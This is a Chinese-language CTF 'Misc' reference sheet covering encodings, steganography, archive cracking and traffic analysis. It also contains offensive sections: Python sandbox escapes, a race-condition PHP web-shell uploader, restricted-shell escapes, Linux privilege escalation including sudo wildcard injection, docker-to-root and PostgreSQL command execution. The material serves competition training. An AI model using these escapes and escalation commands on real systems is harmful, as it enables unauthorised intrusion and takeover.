# Misc — 综合类深度参考

## Quick Wins（先试这些）

```bash
strings * | grep -iE 'flag|CTF|secret|password|ISCC'
strings * | grep -E '\{.*\}'
file *
xxd * | head -50

# 检查文件末尾
tail -c 200 *

# 查看所有文件的 MD5
md5sum *
# Windows: certutil -hashfile * MD5
```

---

## Misc 题型覆盖

Misc 是 CTF 中最杂的分类，包含所有不归入其他类的题目。常见子类：

| 子类 | 典型题目 | 难度 |
|------|---------|------|
| **Python沙箱逃逸(PyJail)** | 受限Python环境下突破 | ⭐⭐⭐⭐⭐ |
| 编码/古典密码混合 | 多层编码堆叠 | ⭐⭐ |
| 脑洞题 | 非常规思维联想 | ⭐⭐⭐ |
| 蓝牙/RFID/SDR | 无线信号分析 | ⭐⭐⭐⭐ |
| 游戏逆向 | 分析游戏逻辑找到flag | ⭐⭐⭐ |
| 拼图/二维码/验证码 | 图像处理识别 | ⭐⭐ |
| 条件竞争/逻辑 | 多线程竞态 | ⭐⭐⭐⭐ |
| 编程题 | 写算法解特定问题 | ⭐⭐ |
| 编程语言特性 | Python字节码/JSFuck等 | ⭐⭐⭐ |
| **SSTI相关** | 服务端模板注入(Misc边界) | ⭐⭐⭐ |
| **序列/数列/数学** | 找规律/解方程 | ⭐⭐ |
| **搭车题** | 藏在题目描述/文件名中的flag | ⭐ |

---

## 1) Python沙箱逃逸 (PyJail) ⭐⭐⭐⭐⭐

PyJail 是 Misc 中最核心的考点，也是最需要技巧的分类。

### 通用逃逸链

**核心思路：从任意对象出发 → 找 object 基类 → 获取 __subclasses__() → 找可利用模块**

```python
# ⭐ 最简逃逸链
# () → tuple → object → subclasses → 找os/system
().__class__.__bases__[0].__subclasses__()

# 等价的链
''.__class__.__mro__[1].__subclasses__()
{}.__class__.__bases__[0].__subclasses__()
[].__class__.__bases__[0].__subclasses__()
().__class__.__mro__[1].__subclasses__()
```

**所有子类的起点模板：**
```python
# 获取所有子类
subs = ().__class__.__bases__[0].__subclasses__()

# 自动找 import_module / system / popen
for i, c in enumerate(subs):
    name = c.__name__
    if 'warning' in name or 'catch' in name:
        print(f"[{i}] {name}")  # 常见的可利用类
    if 'Popen' in name or 'BuiltinImporter' in name:
        print(f"[{i}] {name}")  # 直接执行命令
    if 'wrap_close' in name:
        print(f"[{i}] {name}")  # os._wrap_close 也能用

# 找 warnings.WarningMessage / catch_warnings
[x for x in subs if x.__name__ == 'catch_warnings']
# 或 linecache, os._wrap_close
[x for x in subs if 'wrap_close' in x.__name__]
```

**利用 catch_warnings 逃逸：**
```python
# 如果能找到 catch_warnings 的索引
# __init__.__globals__['sys'].modules['os'].system('sh')
# __init__.__globals__['sys'].modules['builtins'].__dict__['exec']

subs[XXX].__init__.__globals__['sys'].modules['os'].system('cat /flag')
# 或直接用 BuiltinImporter
subs[XXX].load_module('os').system('cat /flag')
```

### 字符限制绕过大全

**无引号 → 从已有字符串中截取**
```python
# 从 __doc__ 中取字符
__doc__[5]     # 很多类的 __doc__ 里有空格和字母
__doc__[7]     # 取 't'
__doc__[11]    # 取 'o'

# 利用 True/False 转字符串
str(True)[0]   # 'T'
str(False)[0]  # 'F'
str(1e308)[2]  # 取数字中的字符

# __doc__ 常用字符参考
# ' '  空格 → __doc__[5] 或 __doc__[6]
# '/'  斜杠 → __doc__[6] 或 [7] 因类而异
# '*'         → __doc__[3]
# '.'  点号  → __doc__[9]
```

**无数字 → 利用布尔运算**
```python
True + True      # 2
True - False     # 1
~(-True - True)  # 1
(True == True)   # True → 1
(True > False)   # True → 1
(False < True)   # True → 1

# 生成各种数字
1 = True == True            # 或 ~False
2 = True + True
3 = True + True + True      # 或 ~(-True - True - True)
4 = ~(-True - True - True - True)

# 用 len 生成
len('a')                    # 1
len('ab')                   # 2
len([])                     # 0
```

**无中括号 → 用 __getitem__**
```python
# [X] 等价于 .__getitem__(X)
().__class__.__bases__[0]
# 等价于
().__class__.__bases__.__getitem__(0)

# 取子串
'alphabet'.__getitem__(slice(0, 3, 1))  # 'alp'
```

**无点号 . → 用 getattr**
```python
# obj.attr 等价于 getattr(obj, 'attr')
getattr((), '__class__')
# 嵌套
getattr(getattr((), '__class__'), '__bases__')
```

**无 __ → 用十六进制编码**
```python
# __class__ → \x5f\x5fclass\x5f\x5f
# 在字符串中: '\x5f\x5fclass\x5f\x5f'
```

**无空格 → 用注释/换行**
```python
# 用 # 或 ''' 换行
().__class__# 这是注释
.__bases__[0]
```

**无字母 → 用 base64/hex 编码的字节**
```python
# bytes.fromhex('6f73').decode() → 'os'
# base64.b64decode(b'b3M=').decode() → 'os'
# chr(111) + chr(115) → 'os'
```

### 常见限制组合与解法

| 限制 | 绕过方法 | 示例 |
|------|---------|------|
| 无 `[]` | `__getitem__(idx)` | `().__class__.__getitem__(0)` |
| 无 `,` | 用函数嵌套 | 部分eval("...") |
| 无 `.` | `getattr(obj, attr)` | `getattr(getattr((), '__class__'), '__mro__')` |
| 无引号 | 从doc/error截取 | `__doc__[5]` 取空格 |
| 无数字 | 布尔运算 | `True+True` = 2 |
| 无字母 | `chr()+bytes` | `chr(111)+chr(115)` = 'os' |
| 无 `__` | 十六进制 | `\x5f\x5f` 替代 `__` |
| 无括号 | 属性遍历 | 较少见，用getter/setter |
| 长度限制 | 分段执行 | `exec()` 多次调用拼接 |
| 只允许一行 | `exec('import os;...')` | 单行执行多语句 |
| 禁用 eval/exec | `__builtins__.__dict__` 遍历 | `[x for x in ().__class__.__bases__[0].__subclasses__()]` |
| 禁用空格 | `#`注释换行/ `\t` | `().__class__\t.__bases__[0]` |

### Python 沙箱逃逸速查模板

```python
# 🚀 完整武器库模板
[
    # 链1: 通过 catch_warnings
    lambda: ().__class__.__bases__[0].__subclasses__()[166]
            .__init__.__globals__['sys'].modules['os'].system('cat /flag'),
    
    # 链2: 通过 BuiltinImporter
    lambda: ().__class__.__bases__[0].__subclasses__()[128]
            .load_module('os').system('cat /flag'),
    
    # 链3: 通过 linecache/os
    lambda: ().__class__.__bases__[0].__subclasses__()[131]
            .__init__.__globals__['os'].system('cat /flag'),
    
    # 链4: 通过 subprocess.Popen (如果允许)
    lambda: ().__class__.__bases__[0].__subclasses__()[251]
            ('cat /flag', shell=True, stdout=-1).communicate()[0],
]
```

### Python Jail 综合解题步骤

```
1. 先试最简单的:
   __import__('os').system('cat /flag')
   eval('print(open("/flag").read())')

2. 如果有 eval/exec 限制：
   ().__class__.__bases__[0].__subclasses__()

3. 找到索引 → 调用 system/exec

4. 如果有字符限制：
   - 字符类型识别（哪些被禁）
   - 用截取/编码替代

5. 如果有长度限制：
   - split 成多段 exec
   - 或利用 stdin/input 逐行输入

6. 终极：内置函数全部禁掉？
   - 用字节码 `compile()` + `exec()`
   - 或 `types.FunctionType`
```

---

## 2) 编码与古典密码混合

### 编码/加密混合

遇到多层编码时：
```python
# 先用自动解码尝试
# 参考 D:\CTF常用脚本\base自动连续解密脚本.py

# 手动递归解码
import base64, binascii

def auto_decode(text):
    """自动循环解码直到不再变化"""
    while True:
        original = text
        # 尝试 hex
        try:
            if set(text) <= set('0123456789ABCDEFabcdef') and len(text) % 2 == 0:
                text = bytes.fromhex(text).decode('utf-8', errors='ignore')
                print(f"hex → {text[:50]}")
                continue
        except: pass
        # 尝试 base32
        try:
            if set(text.upper()) <= set('ABCDEFGHIJKLMNOPQRSTUVWXYZ234567='):
                text = base64.b32decode(text).decode('utf-8', errors='ignore')
                print(f"base32 → {text[:50]}")
                continue
        except: pass
        # 尝试 base64
        try:
            text = base64.b64decode(text).decode('utf-8', errors='ignore')
            print(f"base64 → {text[:50]}")
            continue
        except: pass
        # 尝试反转
        if text[::-1] != text:
            rev = text[::-1]
            if rev.isprintable():
                text = rev
                print(f"reverse → {text[:50]}")
                continue
        # 没有变化 → 终止
        if text == original:
            break
    return text

# 混合编码解密顺序参考
# 常见嵌套：base64 → 反转 → 凯撒 → hex → ascii
# 或: hex → base64 → rot13 → 二进制 → 摩斯
```

### 编码识别快速参考

| 特征 | 编码 | 解码方法 |
|------|------|---------|
| 纯0-9 A-F，长度偶数 | HEX | `bytes.fromhex()` |
| A-Z 2-7 =填充 | Base32 | `base64.b32decode()` |
| A-Za-z0-9+/ = | Base64 | `base64.b64decode()` |
| A-Za-z0-9 无填充 | Base62 | 需安装base62 |
| A-Za-z0-9.-_ | Base64 URL | `base64.urlsafe_b64decode()` |
| 内容重复/字符在A-L | Atbash | 对称替换 |
| 只有0和1, 长度8倍数 | 二进制 | `int(s,2).to_bytes()` |
| 0-7 | 八进制 | `int(s,8)` |
| %XX | URL编码 | `urllib.parse.unquote()` |
| &#NN; | HTML实体 | `html.unescape()` |
| \uXXXX | Unicode | Python自动解析 |
| 只有大写A和B | 培根密码 | 5位一组转字母 |
| 特定频率分布 | 凯撒/单表替换 | `caesar_brute()` |

### 隐写与编码组合

```python
# 显式地检查:
# 1. 每段取特定位置字符
# 2. 奇偶位分离
# 3. 每隔N个字符取一个
# 4. 大小写编码（大写=1, 小写=0）
# 5. 单词首字母拼接

def case_stego(text):
    """大小写隐写：大写为1，小写为0"""
    bits = ''.join('1' if c.isupper() else '0' for c in text if c.isalpha())
    # 每8位转字符
    result = ''
    for i in range(0, len(bits) - 7, 8):
        byte = int(bits[i:i+8], 2)
        if 32 <= byte <= 126:
            result += chr(byte)
    return result
```

---

## 3) 编程/算法题

### 网络交互自动化模板

```python
# 使用 pwntools 连接远程服务
from pwn import *

context.log_level = 'info'  # 减少输出

r = remote('host', port)

# 接收题目
r.recvuntil(b'>>>')  # 或 recvline()
data = r.recvline().decode()

# 解析计算
import re
nums = list(map(int, re.findall(r'\d+', data)))
answer = sum(nums)

# 发送答案
r.sendline(str(answer).encode())

# 接收结果
result = r.recvline().decode()
print(f"Result: {result}")

# 交互模式
r.interactive()
```

### 常见算法题模式

```python
# 模式1: 数学计算（阶乘/求和/质数）
def solve_math_series(limit):
    """计算: 1 + 2 + 3! + 4! + ... + N!"""
    import math
    return sum(math.factorial(i) for i in range(1, limit + 1))

# 模式2: 找规律/数列
# 给定前N项，输出第N+1项
# 方法1: 差分法 — 做差到常数列为止
# 方法2: 神经网络/多项式拟合
# 方法3: 查 OEIS (oeis.org)

# 模式3: 大数运算
# Python 原生支持大整数
a = pow(2, 65537)
b = pow(3, 65537)
result = a + b  # Python自动处理

# 模式4: 与服务器交互猜数字/石头剪刀布
# 如果有伪随机算法，逆向出种子
from ctypes import CDLL
libc = CDLL("msvcrt.dll")  # Windows
libc.srand(seed)  # 设置种子
libc.rand()       # 预测下个随机数
```

### 远程交互高级技巧

```python
# 用 Z3 求解器直接解约束
from z3 import *
s = Solver()

# 定义未知数字
x = Int('x')
s.add(x > 100)
s.add(x < 1000)
s.add(x * 7 == 343)

if s.check() == sat:
    print(s.model())

# 处理大量计算 — 用正则提取
import re

def parse_problem(text):
    """从服务器返回中解析问题"""
    # 例: "计算 1*2 + 3*4 + ... + 99*100 = ?"
    parts = re.findall(r'(\d+)\*(\d+)', text)
    total = sum(int(a) * int(b) for a, b in parts)
    return str(total)

# 超时处理
import socket
socket.setdefaulttimeout(10)
```

---

## 4) 条件竞争 (Race Condition)

### 经典模式

```python
# 场景: 上传文件 → 检查 → 删除
# 在"检查完成"到"删除"之间访问文件

import threading
import requests

target = "http://target/upload.php"
shell_url = "http://target/uploads/shell.php"

def uploader():
    while True:
        requests.post(target, files={'file': ('shell.php', '<?php system($_GET["c"]);?>')})

def accessor():
    while True:
        r = requests.get(shell_url, params={'c': 'cat /flag'})
        if r.status_code == 200 and len(r.text) > 0:
            print(f"FLAG: {r.text}")
            break

# 启动20个线程并发
for _ in range(10):
    threading.Thread(target=uploader, daemon=True).start()
for _ in range(10):
    threading.Thread(target=accessor, daemon=True).start()

# 等待
import time; time.sleep(30)
```

### TCP 连接竞争

```python
# 多个连接同时发送请求
from pwn import *

def attack_one():
    r = remote('host', port)
    r.sendline(b'ADMIN')  # 同时发送管理员请求
    r.sendline(b'flag')
    data = r.recvall()
    if b'flag{' in data:
        print(data)

threads = [threading.Thread(target=attack_one) for _ in range(50)]
for t in threads: t.start()
```

---

## 5) QR Code / 二维码处理

```bash
# 解码二维码
zbarimg qr_code.png
# 或 Python
python3 -c "from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('qr.png'))[0].data)"

# 二维码修复
# 定位模式缺失？用 Photoshop/GIMP 补上三个角
# 损坏的二维码 → 用 qrazybox (https://merri.cx/qrazybox/) 手动修复比特位
```

---

## 6) 脑洞题

### 非常规思路

```python
# 1. 颜色隐写
# RGB 值的最低有效位 (LSB)
from PIL import Image
img = Image.open('pic.png')
pixels = list(img.getdata())
bits = []
for p in pixels:
    for c in p[:3]:  # R, G, B
        bits.append(c & 1)
# LSB 提取

# 2. 文件名/描述中藏flag
# 尝试: 文件名按特定顺序排列、取首字

# 3. 评论区/空白区域有隐藏文字
# 检查: 换行符之间的空白、Color=white的文字

# 4. NaN / Infinity 编码
import math, struct
# float('nan') 和 float('inf') 可以编码数据
# struct.pack('>d', math.nan).hex() 查看nan的payload
```

---

## 7) 蓝牙/RFID/SDR

### 工具

| 类别 | 工具 | 用途 |
|------|------|------|
| 蓝牙 | `hciconfig`, `hcitool` | 扫描蓝牙设备 |
| 蓝牙 | `bluetoothctl` | 蓝牙控制 |
| 蓝牙 | Wireshark | 抓蓝牙包 (.pcapng) |
| RFID | `mfoc` | Mifare Classic破解 |
| RFID | `libnfc` | NFC工具集 |
| SDR | gnuradio | 软件无线电 |
| SDR | rtl-sdr | RTL-SDR控制 |
| SDR | gqrx | SDR频谱分析仪 |

---

## 8) 字节码与语言特性

### JSFuck / Brainfuck 等

```python
# JSFuck: 只用 []()!+ 6个字符
# Brainfuck: 只用 <>+-.,[] 8个字符
# Ook! 等

# 在线解码
# JSFuck: https://jsfuck.com
# Brainfuck: 内置Python
# python3 -c "exec(open('bf.bf').read())"

# Python 字节码
import dis
def func():
    return 1 + 2
dis.dis(func)
# 可以直接构造字节码对象执行
```

### Python 字节码直接执行

```python
# 如果 eval/exec 被禁，可以用字节码
import types

code = compile("print(open('/flag').read())", '<int>', 'exec')
exec(code)  # 如果exec能用

# 甚至直接构造 CodeType
from types import CodeType
# ... 高级 RCE
```

---

## 9) 通用解题流程

```
拿到文件/连接
  ↓ file + strings + xxd 初步分析
  ↓ 识别文件类型/格式
  ↓ 
  ├── 编码 → 递归解码 → flag
  ├── Python Jail → 逃逸链 → RCE
  ├── 网络交互 → pwntools → 解题
  ├── 脑洞题 → 文件名/描述 → 联想
  ├── 图像 → LSB / 通道分离 → 识别
  ├── 音频 → 频谱/波形 → LSB → flag
  ├── 条件竞争 → 竞速 → 绕过检查
  ├── QR码 → zbarimg → 修复
  └── 字节码/JSFuck → 解码/执行
```

### PyJail 特化流程

```
拿到 Jail 连接
  ↓ 试用 eval/exec/__import__
  ↓ 被屏蔽 → 试 eval(chr(95)+chr(95)+...) 编码
  ↓ 也不让 → getattr+__subclasses__() 链
  ↓ 有字符/长度限制？
  │
  ├── 无引号 → __doc__[N] / str(True)[N] 截取
  ├── 无数字 → True+True / ~-True 生成
  ├── 无空格 → # 或 \t 绕过
  ├── 无括号 → __getitem__ 替代
  ├── 无点号 → getattr 替代
  └── 长度限制 → exec 分段 / input 逐行
  ↓
  最终: os.system('cat /flag')
```

---

## 10) 压缩包隐写 / Archive Steganography ⭐⭐⭐

CTF中常见的压缩包相关题型, 包含密码破解、已知明文攻击、伪加密、CRC32碰撞等。

### 压缩包密码破解

```bash
# ZIP密码爆破 (john)
zip2john secret.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# RAR密码爆破
rar2john secret.rar > hash.txt
john hash.txt

# 7z密码爆破
7z2john secret.7z > hash.txt
john hash.txt

# ARCHPR (Windows GUI工具) - 支持字典/掩码/暴力
# 路径: F:\压缩软件\Elcomsoft Password Recovery\Advanced Archive Password Recovery\ARCHPR.exe

# Python ZIP爆破
import zipfile, itertools
z = zipfile.ZipFile('encrypted.zip')
for pwd in common_passwords:
    try:
        z.extractall(pwd=pwd.encode())
        print(f"Password: {pwd}")
        break
    except: pass
```

### ZIP 已知明文攻击 (Known Plaintext Attack)

```bash
# 条件: ZIP中有文件我们能获取到原始明文
# 利用: 使用pkcrack或bkcrack

# bkcrack (支持AES-256 ZIP)
bkcrack -C encrypted.zip -c known_file.txt -p plain_known_file.txt
# 得到密钥后解密
bkcrack -C encrypted.zip -k <keys> -U decrypted.zip password

# pkcrack (传统ZipCrypto)
pkcrack -C encrypted.zip -c known_file.txt -p plain_known_file.txt -d decrypted.zip -a

# 常见可获取的明文文件:
# - readme.txt / LICENSE 等固定内容文件
# - 同压缩软件版本生成的固定字节
# - PNG图片头 \x89PNG\r\n\x1a\n (已知文件是PNG时)
```

### ZIP 伪加密

```python
# ZIP的加密标志位在中央目录和文件条目中
# 伪加密: 只改了加密标志位, 实际未加密

# 修复方法1: 用16进制编辑器
# 搜索 50 4B 01 02 (中央目录签名), 找到加密标志(偏移+8)
# 将 09 00 改为 00 00 (关闭伪加密)
# 文件条目中也类似: 50 4B 03 04 后偏移+6的位置

# 修复方法2: Python脚本
import zipfile
with open('fake_encrypted.zip', 'rb') as f:
    data = bytearray(f.read())

# 找到并修复所有加密标志
# 50 4B 01 02 的偏移+8, 和 50 4B 03 04 的偏移+6
for marker in [b'PK\x01\x02', b'PK\x03\x04']:
    pos = data.find(marker)
    while pos != -1:
        offset = pos + 8 if marker == b'PK\x01\x02' else pos + 6
        if data[offset] & 0x01:  # 加密标志位
            data[offset] &= 0xFE  # 清除加密位
        pos = data.find(marker, pos + 1)

with open('fixed.zip', 'wb') as f:
    f.write(data)

# 修复方法3: WinRAR 修复功能
# 工具 → 修复压缩文件
```

### CRC32 碰撞

```python
# 场景: 压缩包中有多个小文件(≤6字节), 已知其CRC32值
# 利用: 爆破4-6字节的可打印字符串, 匹配CRC

import binascii, itertools, string

target_crc = 0xDEADBEEF  # 从压缩包中获取

# 4字节爆破
for combo in itertools.product(string.printable.strip(), repeat=4):
    s = ''.join(combo)
    if binascii.crc32(s.encode()) & 0xFFFFFFFF == target_crc:
        print(f"Found: {s}")
        break

# 5-6字节爆破 (范围更大, 考虑用多线程)
import concurrent.futures

def crack_crc(target_crc, length):
    for combo in itertools.product(string.printable.strip(), repeat=length):
        s = ''.join(combo)
        if binascii.crc32(s.encode()) & 0xFFFFFFFF == target_crc:
            return s
    return None

with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
    futures = [pool.submit(crack_crc, target_crc, l) for l in range(4, 7)]
    for f in futures:
        result = f.result()
        if result:
            print(f"CRC32 crack result: {result}")
```

### 压缩包注释隐写

```bash
# ZIP注释中包含隐藏信息
unzip -l file.zip  # 查看文件列表
# 或使用 7z
7z l file.zip

# 读取ZIP注释
python -c "
import zipfile
z = zipfile.ZipFile('file.zip')
print(z.comment.decode())
"

# WinRAR查看: 右键 → 显示信息 → 注释
```

### 多卷压缩包 / 嵌套压缩

```bash
# 手动解压嵌套(俄罗斯套娃)
# 有时几百层压缩, 需要脚本:
import zipfile, os
filename = 'flag.zip'
while True:
    with zipfile.ZipFile(filename, 'r') as z:
        names = z.namelist()
        z.extractall('temp')
        filename = os.path.join('temp', names[0])
        print(f"Extracted: {filename}")
    if not filename.endswith('.zip'):
        break
```

### ZIP 结构理解

```
ZIP文件结构:
[文件条目1: 50 4B 03 04 + 文件名 + 数据]
[文件条目2: 50 4B 03 04 + 文件名 + 数据]
...
[中央目录:  50 4B 01 02 + 所有文件元信息]
[目录结束:  50 4B 05 06]

关键字节偏移:
- 50 4B 03 04 + 6: 通用标志位 (bit0=加密)
- 50 4B 01 02 + 8: 加密标志位
- 文件名/注释长度可变
```

### 其他压缩包技巧

```bash
# 1. 压缩包嵌套图片
copy /b image.jpg + secret.zip output.jpg
# 解压: 改后缀为.zip或用binwalk提取
binwalk -Me output.jpg

# 2. RAR伪加密修复
# 同ZIP原理, 修改加密标志位

# 3. 压缩比隐写
# 不同压缩比得到的文件大小可能编码信息

# 4. NTFS压缩 (蓝色文件名)
# 压缩属性可能隐藏数据
compact /u filename  # 解压NTFS压缩
```

### ICMP 数据隐写
```python
# ICMP Echo Request/Reply 的 data 段可编码数据
from scapy.all import *

packets = rdpcap('ping_capture.pcap')
for pkt in packets:
    if pkt.haslayer(ICMP):
        data = bytes(pkt[ICMP].payload)
        if data:
            print(f"ICMP data: {data}")
```

### DNS 隧道隐写
```python
# DNS 查询域名编码数据
packets = rdpcap('dns_tunnel.pcap')
for pkt in packets:
    if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode()
        host = qname.split('.')[0]
        try:
            decoded = bytes.fromhex(host)
            print(f"DNS tunnel: {decoded}")
        except:
            pass
```

### HTTP 头隐写
```python
# HTTP头顺序/大小写/Cookie值编码数据
# 例如 User-Agent 首字母拼接
```

---

## 补充B: 文字游戏/谜题题

### 常见文字技巧
```python
# 1. 每句首字母
"""From strings:
Roses are red
Flag is here
首字母: F R F i h → ...
"""

# 2. 大小写摩斯: 大写=长线(-), 小写=点(.)
def morse_from_case(text):
    morse = ''
    for c in text:
        if c.isupper():
            morse += '-'
        elif c.islower():
            morse += '.'
        elif c == ' ':
            morse += ' '
    return morse

# 3. 颜色隐写（文字颜色与背景同色）
# 4. 空格数量/位置编码
# 5. 特定位置的标点/spoiler字体
```

### Unicode 同形异码检测
```python
import unicodedata

def detect_invisible(text):
    for i, c in enumerate(text):
        cat = unicodedata.category(c)
        if cat in ('Cf', 'Mn', 'Cc'):
            print(f"[{i}] U+{ord(c):04X} ({unicodedata.name(c, '?'):30}) cat={cat}")
```

---

## 补充C: 取证附加技巧

### 时间轴分析
```python
import os, datetime

files = os.listdir('evidence/')
timeline = []
for f in files:
    stat = os.stat(f'evidence/{f}')
    timeline.append((stat.st_mtime, 'modified', f))
    timeline.append((stat.st_ctime, 'created', f))

for ts, event, name in sorted(timeline):
    dt = datetime.datetime.fromtimestamp(ts)
    print(f"{dt} | {event:10} | {name}")
```

### PNG 隐藏技巧
```python
# IDAT块后额外数据 / PLTE异常 / tEXt键值
from PIL import Image
img = Image.open('test.png')
print(img.info)  # 元数据
```

### GIF 逐帧分析
```python
img = Image.open('animated.gif')
for frame in range(getattr(img, 'n_frames', 1)):
    img.seek(frame)
    print(f"Frame {frame}: {img.info}")
```

### DTMF 双音多频解码
```
每个频率对映射一个数字:
1209+697=1, 1336+697=2, 1477+697=3, 1633+697=A
1209+770=4, 1336+770=5, 1477+770=6, 1633+770=B
1209+852=7, 1336+852=8, 1477+852=9, 1633+852=C
1209+941=*, 1336+941=0, 1477+941=#, 1633+941=D
```

### USB键盘流量分析
```python
# 从PCAP中提取USB HID键盘数据
# 首先用tshark提取: tshark -r capture.pcap -T fields -e usb.capdata -Y "usb.src==\"1.2.3\""

# USB HID 键盘键位映射 (Usage ID)
keymap = {
    0x04: ('a', 'A'), 0x05: ('b', 'B'), 0x06: ('c', 'C'),
    0x07: ('d', 'D'), 0x08: ('e', 'E'), 0x09: ('f', 'F'),
    0x0A: ('g', 'G'), 0x0B: ('h', 'H'), 0x0C: ('i', 'I'),
    0x0D: ('j', 'J'), 0x0E: ('k', 'K'), 0x0F: ('l', 'L'),
    0x10: ('m', 'M'), 0x11: ('n', 'N'), 0x12: ('o', 'O'),
    0x13: ('p', 'P'), 0x14: ('q', 'Q'), 0x15: ('r', 'R'),
    0x16: ('s', 'S'), 0x17: ('t', 'T'), 0x18: ('u', 'U'),
    0x19: ('v', 'V'), 0x1A: ('w', 'W'), 0x1B: ('x', 'X'),
    0x1C: ('y', 'Y'), 0x1D: ('z', 'Z'),
    0x1E: ('1', '!'), 0x1F: ('2', '@'), 0x20: ('3', '#'),
    0x21: ('4', '$'), 0x22: ('5', '%'), 0x23: ('6', '^'),
    0x24: ('7', '&'), 0x25: ('8', '*'), 0x26: ('9', '('),
    0x27: ('0', ')'),
    0x28: ('\n', '\n'), 0x29: ('[ESC]', ''), 0x2A: ('[DEL]', ''),
    0x2C: (' ', ' '), 0x2D: ('-', '_'), 0x2E: ('=', '+'),
    0x2F: ('[', '{'), 0x30: (']', '}'),
    0x34: ("'", '"'), 0x36: (',', '<'), 0x37: ('.', '>'),
    0x38: ('/', '?'),
    0x4F: ('[RIGHT]', ''), 0x50: ('[LEFT]', ''),
}

# modifier: bit0=LCtrl, bit1=LShift, bit2=LAlt, bit3=LGUI
#           bit4=RCtrl, bit5=RShift, bit6=RAlt, bit7=RGUI

def parse_usb_keyboard(capdata_list):
    output = []
    for raw in capdata_list:
        data = bytes.fromhex(raw.replace(':', ''))
        if len(data) < 8:
            continue
        modifier = data[0]
        keycode = data[2]  # 第3字节是keycode
        if keycode == 0:
            continue  # 无按键
        shift = bool(modifier & 0x02) or bool(modifier & 0x20)
        if keycode in keymap:
            output.append(keymap[keycode][1] if shift else keymap[keycode][0])
    return ''.join(output)
```

---

## 补充D: 杂项 Misc 综合题速览

| 题型 | 特征 | 解法简述 |
|------|------|---------|
| Python引号填空 | 只有`{}:.-`等符号 | 构造()→tuple→class链 |
| 纯Unicode题 | 看似乱码 | 逐个字符查U+编码 |
| 颜色序列 | RGB字符串 | 取RGB值拼字符串 |
| 折纸/拼图 | 图片碎片 | 拼合后识别 |
| 代码迷宫 | 复杂递归/分支 | Z3/angr约束求解 |
| 二维码修复 | 缺角/遮挡 | qrazybox手动修复 |
| 时钟/日历 | 指针位置/日期 | 理解编码规则 |
| 数学规律 | 数列/方程 | 找规律/OEIS/Z3 |
| 网页console | F12开发者工具 | 找隐藏注释/console.log |

---

## Bash Jail / Restricted Shell（新增V4）

```bash
# 基础逃逸:
HISTFILE=/flag bash; history 2>/dev/null    # HISTFILE trick
bash -v /flag 2>&1                           # verbose mode打印文件
mapfile -t lines < /flag; printf '%s\n' "${lines[@]}"  # bash 4+无外部命令

# 纯bash builtin读取:
while IFS= read -r line; do echo "$line"; done < /flag
exec 3< /flag; cat <&3                        # 重定向

# 命令替代:
x=$(</flag); echo $x                           # 直接读取
a=c;b=at;c=/flag;$a$b $c                       # 变量拼接绕过
$'\143\141\164' /flag                          # 八进制编码绕过

# ctypes.sh (直接C库调用):
dlcall -n fd -r int open /flag 0
dlcall -n bytes -r int read $fd $buf 100
dlcall printf "%s" $buf

# rvim jail:
:python3 import os; os.system("cat /flag")

# 环境变量注入:
export PS4='$(cat /flag)'; set -x              # trace触发
```

---

## RF / SDR 实战（新增V4）

### IQ 格式处理
```python
import numpy as np

# cf32: signal = np.fromfile('capture.cf32', dtype=np.complex64)
# cs16: raw=np.fromfile('cap.cs16',dtype=np.int16); signal=raw[::2]+1j*raw[1::2]
# cu8:  raw=np.fromfile('cap.cu8',dtype=np.uint8); signal=(raw[::2]-127.5)+1j*(raw[1::2]-127.5)
```

### QAM-16 解调模板
```python
# 16-QAM Gray映射 → 最近星座点 → 每2符号拼1字节
gray_map = {
    (-3+3j):0,(-1+3j):1,(1+3j):3,(3+3j):2,
    (-3+1j):4,(-1+1j):5,(1+1j):7,(3+1j):6,
    (-3-1j):12,(-1-1j):13,(1-1j):15,(3-1j):14,
    (-3-3j):8,(-1-3j):9,(1-3j):11,(3-3j):10,
}
```

### 信号问题速查
```
圆星座 → 频率偏移 → Costas Loop载波恢复
螺旋星座 → 频率漂移 → PLL跟踪
散点 → 噪声/未同步 → 调整增益 + Gardner TED定时同步
4-fold歧义 → 尝试 0°/90°/180°/270° 相位旋转
```

---

## DNS Exploitation（新增V4）

### NSEC Walking (DNSSEC区域枚举)
```bash
dig @ns1.target target.com NSEC
# 响应含下一个域名 → 链式遍历 → 完整域名列表
```

### ECS Spoofing
```bash
# EDNS Client Subnet → ACL绕过
dig @dns.target flag.example.com TXT +subnet=10.13.37.1/24
```

### DNS Tunneling
```python
# 数据编码在子域名中外传 (base32/base64)
# 响应在TXT记录/size字段中
# 提取: pkt[DNSQR].qname.split('.')[0] → base32decode → 重组
```

### DNS Rebinding
```
TTL=0 → 第一次解析合法IP(CORS通过) → 第二次解析127.0.0.1(攻击内网)
```

---

## Linux Privilege Escalation（新增V4）

### SUID Abuse
```bash
find / -perm -4000 -type f 2>/dev/null  # 查找SUID
# GTFOBins: bash -p, find -exec, vim -c, cp(覆盖passwd)
```

### Sudo Wildcard Injection
```bash
# sudo规则: /usr/bin/zip /backup/*    # fnmatch跨参数匹配!
touch -- '-T' '--unzip-command=sh -c "cat /flag > /tmp/out"'
sudo /usr/bin/zip /backup.zip *        # *被扩展 → 注入额外标志!
```

### Capabilities
```bash
getcap -r / 2>/dev/null
# cap_setuid+ep → python3 -c 'import os;os.setuid(0);os.system("sh")'
# cap_sys_admin → 挂载; cap_dac_read_search → 读任意文件
```

### Docker 组 → Root
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

### PostgreSQL RCE
```sql
COPY (SELECT '') TO PROGRAM 'cat /flag > /tmp/out';
SELECT pg_read_file('/etc/passwd');
```

## Docker 容器逃逸（新增V4）
```bash
# 特权模式: --privileged → mount host设备
# docker.sock 挂载: -v /var/run/docker.sock → 创建新容器控制host
# CAP_SYS_ADMIN: cgroup release_agent 写入
# /proc 信息泄露: 进程信息/环境变量
```

## BuildKit 密钥利用（新增V4）
```bash
# 暴露的 BuildKit gRPC + --mount=type=secret
# 嵌套build: 外层安装buildctl → 内层mount flag secret → 读取
```
